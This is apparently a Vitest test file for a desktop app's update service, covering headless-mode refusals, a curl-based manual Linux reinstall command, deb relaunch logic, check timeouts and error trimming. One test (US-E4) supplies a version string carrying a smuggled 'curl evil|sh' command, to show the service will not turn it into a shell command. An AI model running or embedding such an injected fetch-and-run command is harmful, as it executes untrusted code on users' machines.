/**
 * `services/updateService.ts` + `ipc/updateHandlers.ts` —— 无头运行时只检查不安装（docs/headless/design.md）：
 * `available` 带 `manual`（Linux 上是重跑安装脚本的命令，别的平台 null；命令只由 `x.y.z[-pre]` 拼出），
 * `update:download` / `update:install` 以 `code: 'headless'` 拒绝，退出时也不顺手装；桌面模式照旧。
 *
 * electron-updater 是手搓的发射器替身（字段每条用例重置成哨兵值），通道注册表用真的（定义经 `listDefinitions`
 * 取出、按网络 / IPC 的上下文调用），广播经挂在注册表上的一条假传输记进 spy。Electron 自己的 autoUpdater 也是替身（deb 的
 * 重启挂在它的 before-quit-for-update 上），linuxRelaunch 打桩（它本身的行为在 utils/__tests__/linuxRelaunch.test.ts）。
 * 每条用例 `vi.resetModules()` 后重新导入
 * （模式开关、更新服务、注册表都是模块级状态）；无头用例先在新导入的 headless 模块上 `enableHeadlessMode()`，
 * 再导入服务。平台经 `process.platform` 打桩（`headlessUpdateCommand` 缺省读它）。
 *
 *   US-E1 桌面（平台 linux）：update-available → 恰是 {type:'available', version, releaseDate, releaseNotes}，没有 manual 键
 *   US-E2 无头 linux：同上 + manual {command: 那条命令}；getLastEvent() 就是它
 *   US-E3 无头 darwin / win32：manual 恰是 {command: null}
 *   US-E4 无头 linux、版本号带 shell 字符：版本号原样转出，manual {command: null}，没有哪个字段含 curl 命令
 *   US-E5 无头 update-not-available → {type:'up-to-date', version}，与桌面一样
 *   US-Q1 无头 init：autoInstallOnAppQuit false、autoDownload false
 *   US-Q2 桌面 init：autoInstallOnAppQuit true、autoDownload false
 *   US-H1 无头 update:download（网络上下文）→ 拒绝 {code:'headless', message}；downloadUpdate 不调；不广播 error；
 *         之前的 available 仍是 lastEvent
 *   US-H2 无头 update:install：调用不同步抛，回 Promise 并以 code headless 拒绝；quitAndInstall 不调；IPC 上下文同样
 *   US-H3 无头 update:check → {success:true}，checkForUpdates 调了
 *   US-H4 桌面 download / install → {success:true}；quitAndInstall 恰以 (false, true) 调一次
 *   US-H5 桌面 download 失败 → 仍回 {success:true}，广播 {type:'error', message}
 *   US-N1 无头经真的网络分发器：update:install / update:download → {t:'result', id, ok:false, error:{message, code:'headless'}}；
 *         update:check → ok:true、value {success:true}
 *   US-D1 桌面 deb：不用 electron-updater 自带的重启（autoRunAppAfterInstall false）；before-quit-for-update 发出前不重启，
 *         发出后 relaunchAfterExit 恰调一次；app.relaunch 从不调
 *   US-D2 桌面非 deb（AppImage、macOS、Windows）：自带的重启不动，不挂监听；before-quit-for-update 也不重启
 *   US-D3 无头 deb：同样不动（本来就不装）
 *   US-D4 deb、普通用户、带 NoNewPrivs：update:install 回 {success:true}，quitAndInstall 不调，广播 error（code restart-required），
 *         退出时不顺手装，也不重启
 *   US-D5 deb、没有 NoNewPrivs：照旧 quitAndInstall (false, true)，不广播 error，退出时安装
 *   US-D6 deb、root、带 NoNewPrivs：root 不提权，照旧安装
 *   US-D7 AppImage、带 NoNewPrivs：不经 pkexec，照旧安装
 *   US-D8 deb 安装失败（electron-updater 发 error，不发 before-quit-for-update）：只转发错误，没有 code，不重启
 *   US-T1 卡住的检查恰在 UPDATE_CHECK_TIMEOUT_MS 超时：之前不广播、不结束；到点广播 {type:'error', message:'Timed out',
 *         code:'timeout'}（也是 lastEvent），处理函数回 {success:true}，electron-updater 的 checkForUpdatesPromise 清成 null，
 *         更新会话（fromPartition('electron-updater', {cache:false})）的连接断一次
 *   US-T2 超时之后再检查：真的再发一次请求，发之前先断连接；之后成功的检查不再断
 *   US-T3 检查还在跑时再点：拿回同一个 promise，不另发请求，只重发 {type:'checking'}；它结束后再点才发新请求
 *   US-T4 成功的检查清掉自己的计时器：之后再过两倍超时也不广播、不断连接
 *   US-T5 检查被拒：广播精简后的 message（没有 code 键），此时还不断连接；下一次检查发请求前先断一次
 *   US-T6 卡住的请求在超时之后才拒（或才成功）：只有那条超时事件，没有未处理的拒绝；下一次检查照常发请求
 *   US-T7 session.fromPartition 抛错：超时事件照旧，处理函数照旧回 {success:true}；下一次检查照常发请求、不抛
 *   US-T8 updater 的 error 事件、downloadUpdate 的拒绝都精简：去掉 Headers 那一截；超长的截成 300 字（末字 …）
 *   US-S1 summarizeUpdateError 表：空行 / Headers: 截断、合并空白、全被截掉时回退整句、300 字封顶
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { ChannelDefinition, ClientContext } from '../../ipc/registry'
import type { UpdateEvent } from '../../types'
/* eslint-disable boundaries/dependencies -- 网络那一半：真的网络分发器 + 测试夹具（产品里是 frontend 引注册表，不是服务引 frontend） */
import { createNetworkDispatcher } from '../../frontend/network/dispatch'
import { netCtx, winCtx } from '../../frontend/network/__tests__/support/fakeNetworkConnection'
/* eslint-enable boundaries/dependencies */

const SENTINEL = Symbol('unset')

type Listener = (...args: unknown[]) => void

interface FakeUpdater {
  logger: unknown
  autoDownload: unknown
  autoInstallOnAppQuit: unknown
  autoRunAppAfterInstall: unknown
  forceDevUpdateConfig: unknown
  on: ReturnType<typeof vi.fn>
  emit(event: string, ...args: unknown[]): void
  checkForUpdates: ReturnType<typeof vi.fn>
  /** electron-updater 的私有字段：卡住的检查超时后服务把它清成 null */
  checkForUpdatesPromise: unknown
  downloadUpdate: ReturnType<typeof vi.fn>
  quitAndInstall: ReturnType<typeof vi.fn>
}

const state = vi.hoisted(() => {
  const nativeListeners = new Map<string, Array<() => void>>()
  return {
    updater: null as unknown,
    /** electron-updater 的 DebUpdater 替身：`makeUpdater('deb')` 的原型 */
    DebUpdater: class {},
    nativeListeners,
    relaunch: vi.fn<() => void>(),
    appRelaunch: vi.fn<() => void>(),
    hasNoNewPrivs: vi.fn<() => boolean>(),
    closeAllConnections: vi.fn(async () => {}),
    fromPartition: vi.fn<(...args: unknown[]) => unknown>()
  }
})

vi.mock('electron', () => ({
  app: { isPackaged: true, relaunch: state.appRelaunch },
  autoUpdater: {
    on: (event: string, listener: () => void) => {
      state.nativeListeners.set(event, [...(state.nativeListeners.get(event) ?? []), listener])
    }
  },
  session: { fromPartition: (...args: unknown[]) => state.fromPartition(...args) }
}))
vi.mock('electron-updater', () => ({
  get autoUpdater() {
    return state.updater
  },
  DebUpdater: state.DebUpdater
}))
vi.mock('../../utils/linuxRelaunch', () => ({
  hasNoNewPrivs: state.hasNoNewPrivs,
  relaunchAfterExit: state.relaunch
}))
vi.mock('../../logger', () => ({
  createLogger: () => ({ info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() })
}))

function makeUpdater(kind: 'deb' | 'other' = 'other'): FakeUpdater {
  const listeners = new Map<string, Listener[]>()
  const updater: FakeUpdater = {
    logger: SENTINEL,
    autoDownload: SENTINEL,
    autoInstallOnAppQuit: SENTINEL,
    autoRunAppAfterInstall: SENTINEL,
    forceDevUpdateConfig: SENTINEL,
    on: vi.fn((event: string, listener: Listener) => {
      listeners.set(event, [...(listeners.get(event) ?? []), listener])
      return updater
    }),
    emit(event, ...args) {
      for (const listener of listeners.get(event) ?? []) listener(...args)
    },
    checkForUpdates: vi.fn(async () => null),
    checkForUpdatesPromise: SENTINEL,
    downloadUpdate: vi.fn(async () => []),
    quitAndInstall: vi.fn()
  }
  if (kind === 'deb') Object.setPrototypeOf(updater, state.DebUpdater.prototype)
  return updater
}

/** Electron 自己的 autoUpdater 发 before-quit-for-update（BaseUpdater.quitAndInstall 装成功后发的那个） */
const emitBeforeQuitForUpdate = (): void => {
  for (const listener of state.nativeListeners.get('before-quit-for-update') ?? []) listener()
}

const HEADLESS_MESSAGE =
  'ShuviX is running headless and does not install updates itself. Update it on the computer running it (on Linux: rerun install-linux.sh).'
const CMD = (tag: string): string =>
  'curl -fsSL https://github.com/wangdongdongc/ShuviX/releases/download/' +
  tag +
  '/install-linux.sh | bash -s -- --version ' +
  tag
const AVAILABLE_INFO = {
  version: '0.2.13',
  releaseDate: '2026-10-14T00:00:00.000Z',
  releaseNotes: 'notes'
}

let updater: FakeUpdater
let broadcast: ReturnType<typeof vi.fn<(channel: string, ...payload: unknown[]) => void>>
let updateService: { getLastEvent(): UpdateEvent | null; checkForUpdates(): Promise<void> }
let UPDATE_CHECK_TIMEOUT_MS: number
let summarizeUpdateError: (message: string) => string
let listDefinitions: () => readonly ChannelDefinition[]

const platformDescriptor = Object.getOwnPropertyDescriptor(process, 'platform')!
const setPlatform = (value: NodeJS.Platform): void => {
  Object.defineProperty(process, 'platform', { ...platformDescriptor, value })
}

/** 按模式导入一套新的模块：假传输（记广播）→ headless 开关 → 服务 init → 注册更新处理器 */
async function boot(mode: 'desktop' | 'headless'): Promise<void> {
  const registry = await import('../../ipc/registry')
  registry.attachTransport({
    name: 'test',
    serve: () => {},
    owns: () => false,
    pushTo: () => {},
    isClientAlive: () => false,
    onClientGone: () => () => {},
    broadcast: (channel, payload) => broadcast(channel, ...payload)
  })
  listDefinitions = registry.listDefinitions
  const headless = await import('../../utils/headless')
  if (mode === 'headless') headless.enableHeadlessMode()
  const service = await import('../updateService')
  service.updateService.init()
  updateService = service.updateService
  UPDATE_CHECK_TIMEOUT_MS = service.UPDATE_CHECK_TIMEOUT_MS
  summarizeUpdateError = service.summarizeUpdateError
  // eslint-disable-next-line boundaries/dependencies -- 服务与它的 IPC 处理器在一个用例里接起来（产品里是 ipc 引服务，不是反过来）
  const handlers = await import('../../ipc/updateHandlers')
  handlers.registerUpdateHandlers()
}

function handlerOf(channel: string): (ctx: ClientContext, ...args: unknown[]) => unknown {
  const definition = listDefinitions().find((d) => d.channel === channel)
  if (definition === undefined || definition.kind !== 'handle') {
    throw new Error(`no handle definition for ${channel}`)
  }
  return definition.fn
}

/** 只取 update:event 的广播负载 */
const updateEvents = (): unknown[] =>
  broadcast.mock.calls.filter((call) => call[0] === 'update:event').map((call) => call[1])

beforeEach(() => {
  vi.resetModules()
  updater = makeUpdater()
  state.updater = updater
  state.nativeListeners.clear()
  state.relaunch.mockReset()
  state.appRelaunch.mockReset()
  state.hasNoNewPrivs.mockReset().mockReturnValue(false)
  broadcast = vi.fn<(channel: string, ...payload: unknown[]) => void>()
  state.closeAllConnections.mockReset().mockResolvedValue(undefined)
  state.fromPartition
    .mockReset()
    .mockImplementation(() => ({ closeAllConnections: state.closeAllConnections }))
})

afterEach(() => {
  vi.useRealTimers()
  Object.defineProperty(process, 'platform', platformDescriptor)
  vi.restoreAllMocks()
})

describe('US-E update-available / update-not-available 的广播', () => {
  it('US-E1 桌面（linux）：恰是四个字段，没有 manual 键', async () => {
    setPlatform('linux')
    await boot('desktop')
    updater.emit('update-available', AVAILABLE_INFO)
    expect(broadcast).toHaveBeenCalledTimes(1)
    expect(broadcast.mock.calls[0]).toStrictEqual([
      'update:event',
      {
        type: 'available',
        version: '0.2.13',
        releaseDate: '2026-10-14T00:00:00.000Z',
        releaseNotes: 'notes'
      }
    ])
    expect('manual' in (broadcast.mock.calls[0][1] as object)).toBe(false)
  })

  it('US-E2 无头 linux：带 manual {command}；getLastEvent() 就是它', async () => {
    setPlatform('linux')
    await boot('headless')
    updater.emit('update-available', AVAILABLE_INFO)
    const expected = {
      type: 'available',
      version: '0.2.13',
      releaseDate: '2026-10-14T00:00:00.000Z',
      releaseNotes: 'notes',
      manual: { command: CMD('v0.2.13') }
    }
    expect(broadcast).toHaveBeenCalledTimes(1)
    expect(broadcast.mock.calls[0]).toStrictEqual(['update:event', expected])
    expect(updateService.getLastEvent()).toStrictEqual(expected)
  })

  it.each([['darwin'], ['win32']] as const)(
    'US-E3 无头 %s：manual 恰是 {command: null}',
    async (platform) => {
      setPlatform(platform)
      await boot('headless')
      updater.emit('update-available', { ...AVAILABLE_INFO, releaseNotes: [{ note: 'x' }] })
      expect(updateEvents()).toStrictEqual([
        {
          type: 'available',
          version: '0.2.13',
          releaseDate: '2026-10-14T00:00:00.000Z',
          releaseNotes: null,
          manual: { command: null }
        }
      ])
    }
  )

  it('US-E4 无头 linux、版本号带 shell 字符：原样转出，manual {command: null}，不出现 curl 命令', async () => {
    setPlatform('linux')
    await boot('headless')
    const version = '0.2.13; curl evil|sh'
    updater.emit('update-available', { ...AVAILABLE_INFO, version })
    const events = updateEvents()
    expect(events.length).toBe(1)
    const event = events[0] as Extract<UpdateEvent, { type: 'available' }>
    expect(event.version).toBe(version)
    expect(event.manual).toStrictEqual({ command: null })
    expect(JSON.stringify(event)).not.toContain('curl -fsSL')
  })

  it('US-E5 无头 update-not-available → {type:up-to-date, version}', async () => {
    setPlatform('linux')
    await boot('headless')
    updater.emit('update-not-available', { version: '0.2.12' })
    expect(updateEvents()).toStrictEqual([{ type: 'up-to-date', version: '0.2.12' }])
    expect(updateService.getLastEvent()).toStrictEqual({ type: 'up-to-date', version: '0.2.12' })
  })
})

describe('US-Q init 时 electron-updater 的开关', () => {
  it('US-Q1 无头：退出时不安装，不自动下载', async () => {
    await boot('headless')
    expect(updater.autoInstallOnAppQuit).toBe(false)
    expect(updater.autoDownload).toBe(false)
  })

  it('US-Q2 桌面：退出时安装，不自动下载', async () => {
    await boot('desktop')
    expect(updater.autoInstallOnAppQuit).toBe(true)
    expect(updater.autoDownload).toBe(false)
  })
})

describe('US-H 更新通道的处理函数', () => {
  it('US-H1 无头 update:download（网络上下文）→ 以 code headless 拒绝；不下载、不广播 error、lastEvent 不变', async () => {
    setPlatform('linux')
    await boot('headless')
    updater.emit('update-available', AVAILABLE_INFO)
    const before = updateService.getLastEvent()
    expect(before?.type).toBe('available')
    const callsBefore = broadcast.mock.calls.length

    const pending = handlerOf('update:download')(netCtx(1))
    expect(pending).toBeInstanceOf(Promise)
    await expect(pending).rejects.toMatchObject({ code: 'headless', message: HEADLESS_MESSAGE })
    expect(updater.downloadUpdate).not.toHaveBeenCalled()
    expect(broadcast.mock.calls.length).toBe(callsBefore)
    expect(updateEvents().some((e) => (e as UpdateEvent).type === 'error')).toBe(false)
    expect(updateService.getLastEvent()).toBe(before)
  })

  it.each([
    ['network', netCtx(1)],
    ['ipc', winCtx()]
  ] as const)(
    'US-H2 无头 update:install（%s）：不同步抛，回 Promise 并以 code headless 拒绝；不调 quitAndInstall',
    async (_label, ctx) => {
      await boot('headless')
      const handler = handlerOf('update:install')
      let pending: unknown
      expect(() => {
        pending = handler(ctx)
      }).not.toThrow()
      expect(pending).toBeInstanceOf(Promise)
      await expect(pending).rejects.toMatchObject({ code: 'headless', message: HEADLESS_MESSAGE })
      expect(updater.quitAndInstall).not.toHaveBeenCalled()
      expect(broadcast).not.toHaveBeenCalled()
    }
  )

  it('US-H3 无头 update:check → {success:true}，checkForUpdates 调了', async () => {
    await boot('headless')
    await expect(handlerOf('update:check')(netCtx(1))).resolves.toStrictEqual({ success: true })
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(1)
  })

  it('US-H4 桌面 download / install → {success:true}；quitAndInstall 恰以 (false, true) 调一次', async () => {
    await boot('desktop')
    await expect(handlerOf('update:download')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(updater.downloadUpdate).toHaveBeenCalledTimes(1)
    await expect(handlerOf('update:install')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(updater.quitAndInstall).toHaveBeenCalledTimes(1)
    expect(updater.quitAndInstall.mock.calls[0]).toStrictEqual([false, true])
  })

  it('US-H5 桌面 download 失败 → 仍回 {success:true}，广播 error', async () => {
    await boot('desktop')
    updater.downloadUpdate.mockRejectedValueOnce(new Error('boom'))
    await expect(handlerOf('update:download')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(broadcast.mock.calls).toStrictEqual([
      ['update:event', { type: 'error', message: 'boom' }]
    ])
    expect(updateService.getLastEvent()).toStrictEqual({ type: 'error', message: 'boom' })
  })
})

describe('US-N 经真的网络分发器', () => {
  it('US-N1 无头：install / download → ok:false + code headless；check → ok:true', async () => {
    await boot('headless')
    const dispatcher = createNetworkDispatcher({
      definitionOf: (channel) => listDefinitions().find((d) => d.channel === channel)
    })
    const ctx = netCtx(1)
    await expect(
      dispatcher.invoke(ctx, { t: 'invoke', id: 1, channel: 'update:install', args: [] })
    ).resolves.toStrictEqual({
      t: 'result',
      id: 1,
      ok: false,
      error: { message: HEADLESS_MESSAGE, code: 'headless' }
    })
    await expect(
      dispatcher.invoke(ctx, { t: 'invoke', id: 2, channel: 'update:download', args: [] })
    ).resolves.toStrictEqual({
      t: 'result',
      id: 2,
      ok: false,
      error: { message: HEADLESS_MESSAGE, code: 'headless' }
    })
    await expect(
      dispatcher.invoke(ctx, { t: 'invoke', id: 3, channel: 'update:check', args: [] })
    ).resolves.toStrictEqual({ t: 'result', id: 3, ok: true, value: { success: true } })
    expect(updater.quitAndInstall).not.toHaveBeenCalled()
    expect(updater.downloadUpdate).not.toHaveBeenCalled()
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(1)
  })
})

describe('US-D deb 更新：自己重启，带 NoNewPrivs 时不试', () => {
  const useDebUpdater = (): void => {
    updater = makeUpdater('deb')
    state.updater = updater
  }
  const asUser = (): void => {
    vi.spyOn(process, 'getuid').mockReturnValue(1000)
  }

  it('US-D1 桌面 deb：不用自带的重启；装成功（before-quit-for-update）才重启，不经 app.relaunch', async () => {
    useDebUpdater()
    asUser()
    await boot('desktop')
    expect(updater.autoRunAppAfterInstall).toBe(false)

    await expect(handlerOf('update:install')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(updater.quitAndInstall.mock.calls).toStrictEqual([[false, true]])
    expect(state.relaunch).not.toHaveBeenCalled()

    emitBeforeQuitForUpdate()
    expect(state.relaunch).toHaveBeenCalledTimes(1)
    expect(state.appRelaunch).not.toHaveBeenCalled()
  })

  it('US-D2 桌面非 deb：自带的重启不动，不挂监听', async () => {
    asUser()
    await boot('desktop')
    expect(updater.autoRunAppAfterInstall).toBe(SENTINEL)
    expect(state.nativeListeners.size).toBe(0)
    emitBeforeQuitForUpdate()
    expect(state.relaunch).not.toHaveBeenCalled()
  })

  it('US-D3 无头 deb：同样不动', async () => {
    useDebUpdater()
    asUser()
    await boot('headless')
    expect(updater.autoRunAppAfterInstall).toBe(SENTINEL)
    expect(state.nativeListeners.size).toBe(0)
  })

  it('US-D4 deb、普通用户、带 NoNewPrivs：不试 pkexec，广播 restart-required，退出时不装', async () => {
    useDebUpdater()
    asUser()
    state.hasNoNewPrivs.mockReturnValue(true)
    await boot('desktop')
    expect(updater.autoInstallOnAppQuit).toBe(false)

    await expect(handlerOf('update:install')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(updater.quitAndInstall).not.toHaveBeenCalled()
    const events = updateEvents() as Array<Extract<UpdateEvent, { type: 'error' }>>
    expect(events.length).toBe(1)
    expect(events[0].type).toBe('error')
    expect(events[0].code).toBe('restart-required')
    expect(events[0].message).toContain('open it again')
    expect(updateService.getLastEvent()).toBe(events[0])
    expect(state.relaunch).not.toHaveBeenCalled()
  })

  it('US-D5 deb、没有 NoNewPrivs：照旧安装，退出时也安装', async () => {
    useDebUpdater()
    asUser()
    await boot('desktop')
    expect(updater.autoInstallOnAppQuit).toBe(true)
    await handlerOf('update:install')(winCtx())
    expect(updater.quitAndInstall.mock.calls).toStrictEqual([[false, true]])
    expect(updateEvents()).toStrictEqual([])
  })

  it('US-D6 deb、root、带 NoNewPrivs：root 不提权，照旧安装', async () => {
    useDebUpdater()
    vi.spyOn(process, 'getuid').mockReturnValue(0)
    state.hasNoNewPrivs.mockReturnValue(true)
    await boot('desktop')
    expect(updater.autoInstallOnAppQuit).toBe(true)
    await handlerOf('update:install')(winCtx())
    expect(updater.quitAndInstall).toHaveBeenCalledTimes(1)
    expect(updateEvents()).toStrictEqual([])
  })

  it('US-D7 AppImage、带 NoNewPrivs：不经 pkexec，照旧安装', async () => {
    asUser()
    state.hasNoNewPrivs.mockReturnValue(true)
    await boot('desktop')
    expect(updater.autoInstallOnAppQuit).toBe(true)
    await handlerOf('update:install')(winCtx())
    expect(updater.quitAndInstall).toHaveBeenCalledTimes(1)
    expect(updateEvents()).toStrictEqual([])
  })

  it('US-D8 deb 安装失败：只转发错误，不带 code，不重启', async () => {
    useDebUpdater()
    asUser()
    await boot('desktop')
    updater.quitAndInstall.mockImplementationOnce(() => {
      updater.emit('error', new Error('Command pkexec exited with code 126'))
    })
    await handlerOf('update:install')(winCtx())
    expect(updateEvents()).toStrictEqual([
      { type: 'error', message: 'Command pkexec exited with code 126' }
    ])
    expect(state.relaunch).not.toHaveBeenCalled()
  })
})

interface Deferred<T> {
  promise: Promise<T>
  resolve(value: T): void
  reject(err: unknown): void
}

function deferred<T>(): Deferred<T> {
  let resolve!: (value: T) => void
  let reject!: (err: unknown) => void
  const promise = new Promise<T>((res, rej) => {
    resolve = res
    reject = rej
  })
  return { promise, resolve, reject }
}

/** 记下 promise 是否已结束（不吞它的结果） */
function track<T>(promise: Promise<T>): { settled: () => boolean } {
  let done = false
  promise.then(
    () => {
      done = true
    },
    () => {
      done = true
    }
  )
  return { settled: () => done }
}

/** 把微任务和一轮真的宏任务都跑完（只假了 setTimeout / clearTimeout） */
const flush = (): Promise<void> => new Promise((resolve) => setImmediate(resolve))

const TIMEOUT_EVENT = { type: 'error', message: 'Timed out', code: 'timeout' }

/** 桌面启动后再假计时器（boot 里的动态导入不受影响） */
async function bootWithFakeTimers(): Promise<void> {
  await boot('desktop')
  vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
}

const stuck = (): void => {
  updater.checkForUpdates.mockImplementationOnce(() => new Promise(() => {}))
}

describe('US-T 检查的超时与恢复', () => {
  it('US-T1 卡住的检查恰在 UPDATE_CHECK_TIMEOUT_MS 超时', async () => {
    await bootWithFakeTimers()
    stuck()
    const p = handlerOf('update:check')(winCtx()) as Promise<unknown>
    const tracked = track(p)

    await vi.advanceTimersByTimeAsync(UPDATE_CHECK_TIMEOUT_MS - 1)
    expect(updateEvents()).toStrictEqual([])
    expect(tracked.settled()).toBe(false)
    expect(state.closeAllConnections).not.toHaveBeenCalled()

    await vi.advanceTimersByTimeAsync(1)
    expect(updateEvents()).toStrictEqual([TIMEOUT_EVENT])
    expect(updateService.getLastEvent()).toStrictEqual(TIMEOUT_EVENT)
    await expect(p).resolves.toStrictEqual({ success: true })
    expect(updater.checkForUpdatesPromise).toBeNull()
    expect(state.fromPartition).toHaveBeenCalledExactlyOnceWith('electron-updater', {
      cache: false
    })
    expect(state.closeAllConnections).toHaveBeenCalledTimes(1)
  })

  it('US-T2 超时之后再检查：先断连接再发新请求；之后成功的检查不再断', async () => {
    await bootWithFakeTimers()
    stuck()
    const p1 = handlerOf('update:check')(winCtx())
    await vi.advanceTimersByTimeAsync(UPDATE_CHECK_TIMEOUT_MS)
    await p1
    expect(updateEvents()).toStrictEqual([TIMEOUT_EVENT])
    expect(state.closeAllConnections).toHaveBeenCalledTimes(1)

    await expect(handlerOf('update:check')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(2)
    expect(state.closeAllConnections).toHaveBeenCalledTimes(2)
    expect(state.closeAllConnections.mock.invocationCallOrder[1]).toBeLessThan(
      updater.checkForUpdates.mock.invocationCallOrder[1]
    )
    expect(updateEvents()).toStrictEqual([TIMEOUT_EVENT])

    await handlerOf('update:check')(winCtx())
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(3)
    expect(state.closeAllConnections).toHaveBeenCalledTimes(2)
  })

  it('US-T3 检查还在跑时再点：同一个 promise，只重发 checking；结束后再点才发新请求', async () => {
    await bootWithFakeTimers()
    const d = deferred<null>()
    updater.checkForUpdates.mockImplementationOnce(() => d.promise)
    const p1 = updateService.checkForUpdates()
    const p2 = updateService.checkForUpdates()
    expect(p1).toBe(p2)
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(1)
    expect(updateEvents()).toStrictEqual([{ type: 'checking' }])

    d.resolve(null)
    await p1
    const p3 = updateService.checkForUpdates()
    expect(p3).not.toBe(p1)
    await p3
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(2)
  })

  it('US-T4 成功的检查清掉自己的计时器', async () => {
    await bootWithFakeTimers()
    await expect(handlerOf('update:check')(winCtx())).resolves.toStrictEqual({ success: true })
    await vi.advanceTimersByTimeAsync(UPDATE_CHECK_TIMEOUT_MS * 2)
    expect(updateEvents()).toStrictEqual([])
    expect(state.fromPartition).not.toHaveBeenCalled()
    expect(state.closeAllConnections).not.toHaveBeenCalled()
  })

  it('US-T5 检查被拒：广播精简后的 message；下一次检查发请求前先断连接', async () => {
    await boot('desktop')
    updater.checkForUpdates.mockRejectedValueOnce(
      new Error('Cannot find latest.yml\n\nHeaders: {"x":"1"}\n<html>…')
    )
    await expect(handlerOf('update:check')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(updateEvents()).toStrictEqual([{ type: 'error', message: 'Cannot find latest.yml' }])
    expect(state.closeAllConnections).not.toHaveBeenCalled()

    await handlerOf('update:check')(winCtx())
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(2)
    expect(state.closeAllConnections).toHaveBeenCalledTimes(1)
    expect(state.closeAllConnections.mock.invocationCallOrder[0]).toBeLessThan(
      updater.checkForUpdates.mock.invocationCallOrder[1]
    )
  })

  it.each([
    ['拒绝', (d: Deferred<null>) => d.reject(new Error('socket hang up'))],
    ['成功', (d: Deferred<null>) => d.resolve(null)]
  ] as const)(
    'US-T6 卡住的请求超时之后才%s：只有超时事件，下一次照常发请求',
    async (_l, settle) => {
      const unhandled = vi.fn()
      process.on('unhandledRejection', unhandled)
      try {
        await bootWithFakeTimers()
        const d = deferred<null>()
        updater.checkForUpdates.mockImplementationOnce(() => d.promise)
        const p = handlerOf('update:check')(winCtx())
        await vi.advanceTimersByTimeAsync(UPDATE_CHECK_TIMEOUT_MS)
        await expect(p).resolves.toStrictEqual({ success: true })

        settle(d)
        await flush()
        await flush()
        expect(updateEvents()).toStrictEqual([TIMEOUT_EVENT])
        expect(unhandled).not.toHaveBeenCalled()

        await expect(handlerOf('update:check')(winCtx())).resolves.toStrictEqual({ success: true })
        expect(updater.checkForUpdates).toHaveBeenCalledTimes(2)
        expect(updateEvents()).toStrictEqual([TIMEOUT_EVENT])
      } finally {
        process.off('unhandledRejection', unhandled)
      }
    }
  )

  it('US-T7 session.fromPartition 抛错：超时事件照旧；下一次检查照常发请求、不抛', async () => {
    await bootWithFakeTimers()
    state.fromPartition.mockImplementation(() => {
      throw new Error('no session')
    })
    stuck()
    const p = handlerOf('update:check')(winCtx())
    await vi.advanceTimersByTimeAsync(UPDATE_CHECK_TIMEOUT_MS)
    await expect(p).resolves.toStrictEqual({ success: true })
    expect(updateEvents()).toStrictEqual([TIMEOUT_EVENT])
    expect(updater.checkForUpdatesPromise).toBeNull()

    await expect(handlerOf('update:check')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(2)
    expect(state.fromPartition).toHaveBeenCalledTimes(2)
  })

  it('US-T8 error 事件与 downloadUpdate 的拒绝都精简', async () => {
    await boot('desktop')
    updater.emit('error', new Error('HttpError: 404\nHeaders: {...}'))
    expect(updateEvents()).toStrictEqual([{ type: 'error', message: 'HttpError: 404' }])

    updater.downloadUpdate.mockRejectedValueOnce(new Error('a'.repeat(1000)))
    await expect(handlerOf('update:download')(winCtx())).resolves.toStrictEqual({ success: true })
    const last = updateEvents().at(-1) as Extract<UpdateEvent, { type: 'error' }>
    expect(last.type).toBe('error')
    expect(last.message.length).toBe(300)
    expect(last.message.endsWith('…')).toBe(true)
    expect(last.message).toBe(`${'a'.repeat(299)}…`)
  })
})

describe('US-S summarizeUpdateError', () => {
  beforeEach(async () => {
    summarizeUpdateError = (await import('../updateService')).summarizeUpdateError
  })

  it.each([
    ['a\n\nb', 'a'],
    ['a \n \t\n b', 'a'],
    ['Status 404 Headers: {...}', 'Status 404'],
    ['  x\n  y\tz  ', 'x y z'],
    ['Headers: only', 'Headers: only'],
    ['b'.repeat(300), 'b'.repeat(300)],
    ['c'.repeat(301), `${'c'.repeat(299)}…`],
    ['', '']
  ])('US-S1 %j → %j', (input, expected) => {
    const out = summarizeUpdateError(input)
    expect(out).toBe(expected)
    expect(out.length).toBeLessThanOrEqual(300)
  })
})
